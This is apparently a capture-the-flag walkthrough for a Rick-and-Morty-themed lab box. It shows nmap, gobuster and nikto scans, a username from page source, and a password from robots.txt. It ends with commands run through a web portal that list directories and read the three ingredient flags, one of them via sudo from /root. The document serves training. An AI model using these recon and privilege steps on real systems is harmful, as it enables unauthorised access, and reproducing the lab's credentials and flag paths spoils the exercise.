@@ -1,0 +1,86 @@
+ENUMERATION
+
+nmap -vv -A 10.10.249.187
+PORT   STATE SERVICE REASON         VERSION
+22/tcp open  ssh     syn-ack ttl 63 OpenSSH 7.2p2 Ubuntu 4ubuntu2.6 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 7f:48:47:19:1a:d3:63:cf:7f:60:0f:8c:3c:63:82:97 (RSA)
+| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDt4WUrYhUkKJKbcz3d54S7OEUJCU9g3/ZW7O0d7pM/H4j1l3mAsS9nMD0RP+DBSPfShvV7OvpP6rBzSClJzqbLOoXYBMck3nBwNjpBZrDcpwYHoB9b0uMW9s65DswzIOIJeOmomLH7HzOVoZbYkLI0/IlDqfYqgMGU8/I5US7/a0wH9C+/pCcB7CmaaHXpyylaTx/QJzbsJsz8WBa2hOTaDKoCLX67tbaLxGqTz/gh2BwbCucJrMYqMQ13L6H9EZJik8u2ECoBi7YL0OoBeEfScgbANQIx/CO/0Kz1TdcoLMhMW8y8t3EVUrbQ4Fyt1WF9Dg+N38h2TKkIMr3aL24b
+|   256 ce:1b:7b:ef:40:40:4a:bb:75:31:45:71:ca:93:f3:7e (ECDSA)
+| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBMy03Ct0CS/dNgubMQtF5pd4vDcY9D3lLBtjxrSiSwItRLBNMfSDvBH5+7vUapcXtJjuWiS4bV2+fi4JOQw2bGs=
+|   256 be:41:64:f9:b5:ff:1b:9d:45:62:88:37:c6:92:22:1d (ED25519)
+|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIMBuHq5IvhpcfHhb6rd2ALT0EtBS+BiBnyhQeSKC0Yqo
+80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.18 ((Ubuntu))
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+|_http-server-header: Apache/2.4.18 (Ubuntu)
+|_http-title: Rick is sup4r cool
+
+WEB DIRECTORY DISCOVERY
+ gobuster -u 10.10.249.187 -w /usr/share/seclists/Discovery/Web-Content/common.txt -t 80 -a Linux
+
+Gobuster v1.4.1              OJ Reeves (@TheColonial)
+=====================================================
+=====================================================
+[+] Mode         : dir
+[+] Url/Domain   : http://10.10.249.187/
+[+] Threads      : 80
+[+] Wordlist     : /usr/share/seclists/Discovery/Web-Content/common.txt
+[+] Status codes : 302,307,200,204,301
+[+] User Agent   : Linux
+=====================================================
+/assets (Status: 301)
+/index.html (Status: 200)
+/robots.txt (Status: 200)
+
+ENUMERATE WEBSITE
+
+ nikto -h http://10.10.249.187
+- Nikto v2.1.6
+---------------------------------------------------------------------------
++ Target IP:          10.10.249.187
++ Target Hostname:    10.10.249.187
++ Target Port:        80
++ Start Time:         2020-10-12 16:34:43 (GMT-4)
+---------------------------------------------------------------------------
++ Server: Apache/2.4.18 (Ubuntu)
++ Server leaks inodes via ETags, header found with file /, fields: 0x426 0x5818ccf125686 
++ The anti-clickjacking X-Frame-Options header is not present.
++ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
++ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
++ No CGI Directories found (use '-C all' to force check all possible dirs)
++ Cookie PHPSESSID created without the httponly flag
++ Allowed HTTP Methods: GET, HEAD, POST, OPTIONS 
++ OSVDB-3233: /icons/README: Apache default file found.
++ /login.php: Admin login page/section found.
+
+
+INVESTIGATE NEW WEB PAGES
+view-source:http://10.10.249.187/index.html
+Username: R1ckRul3s
+
+http://10.10.249.187/robots.txt
+Wubbalubbadubdub
+
+
+LOGIN TO RICK PORTAL
+http://10.10.249.187/portal.php
+
+
+VIEW FILES WITH INGREDIENTS
+
+1. First ingredient
+ls -alhR /var/www/
+
+tac /var/www/html/Sup3rS3cretPickl3Ingred.txt
+
+2. Second ingredient
+ls -alhR /home
+
+tac "/home/rick/second ingredients"
+
+3. Third ingredient
+
+ls -alhR /root
+
+sudo tac /root/3rd.txt
